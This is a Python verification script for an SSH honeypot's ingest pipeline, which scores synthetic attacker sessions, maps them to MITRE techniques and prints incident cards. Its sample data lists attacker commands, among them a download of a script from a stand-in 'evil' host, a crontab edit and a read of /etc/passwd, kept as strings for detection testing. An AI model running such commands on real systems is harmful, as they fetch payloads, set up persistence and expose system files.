"""Phase 4 verification — runs the full ingest pipeline against sample sessions.

Usage (from the project root):
    DATABASE_URL="sqlite:///data/sentinelssh.sqlite3" \
    THREAT_FEED_PATH="data/threat_feed.txt" \
    .venv/bin/python scripts/verify_phase4.py

It feeds a few synthetic attacker sessions through:
    Capture -> Enrichment -> Risk -> Behaviour -> Incident -> Database
then prints the scored results and the resulting incident cards.
"""
from __future__ import annotations

import json
import sys
from datetime import datetime, timezone
from pathlib import Path

# Ensure the project root is importable when run as `python scripts/...`.
sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from core.db import session_scope
from core.models import Attack, Incident
from core.pipeline import CapturedCommand, CapturedSession, IngestPipeline


def _capture(ip: str, user: str, commands: list[str], attempts: int = 5) -> CapturedSession:
    now = datetime.now(timezone.utc).isoformat()
    return CapturedSession(
        session_id=f"{user}-{ip}-{now}",
        timestamp=now,
        source_ip=ip,
        source_port=44321,
        username=user,
        password="123456",
        ssh_version="SSH-2.0-libssh_0.9.6",
        duration=2.5,
        auth_attempts=attempts,
        commands=[CapturedCommand(timestamp=now, command=c) for c in commands],
    )


SAMPLES = [
    # (ip, username, commands) — first IP is in the sample threat feed (185.220.100.0/22)
    ("185.220.100.5", "root", ["uname -a", "whoami", "wget http://evil/x.sh", "crontab -e", "cat /etc/passwd"]),
    ("185.220.100.5", "admin", ["id"]),  # repeat offender, same incident
    ("8.8.8.8", "ubuntu", ["ls -la"]),    # foreign, not malicious
    ("192.168.1.50", "pi", []),            # private/local
]


def main() -> None:
    pipeline = IngestPipeline()
    print("=" * 78)
    print("RUNNING INGEST PIPELINE ON SAMPLE SESSIONS")
    print("=" * 78)
    for ip, user, cmds in SAMPLES:
        snap = pipeline.process(_capture(ip, user, cmds))
        reasons = ["{}(+{})".format(r["reason"], r["points"]) for r in snap["risk_reasons"]]
        mitre = ["{} {}".format(m["id"], m["name"]) for m in snap["mitre"]]
        print(f"\n[{ip}] user={user!r}")
        print(f"  country      : {snap['country']}  asn={snap['asn']}  isp={snap['isp']}")
        print(f"  risk         : {snap['risk_score']} ({snap['risk_level'].upper()})  malicious={snap['is_malicious']}")
        print(f"  reasons      : {reasons}")
        print(f"  behaviors    : {snap['behaviors']}")
        print(f"  MITRE        : {mitre}")
        print(f"  incident_id  : {snap['incident_id']}")
    pipeline.close()

    print("\n" + "=" * 78)
    print("DATABASE STATE")
    print("=" * 78)
    with session_scope() as s:
        print(f"attacks stored   : {s.query(Attack).count()}")
        print(f"incidents created: {s.query(Incident).count()}")
        print("\nINCIDENT CARDS:")
        for inc in s.query(Incident).order_by(Incident.max_risk_score.desc()).all():
            techs = json.loads(inc.mitre_techniques or "[]")
            print(f"  #{inc.id} {inc.title}")
            print(f"      status={inc.status} max_risk={inc.max_risk_score} attempts={inc.attempt_count} mitre={techs}")


if __name__ == "__main__":
    main()
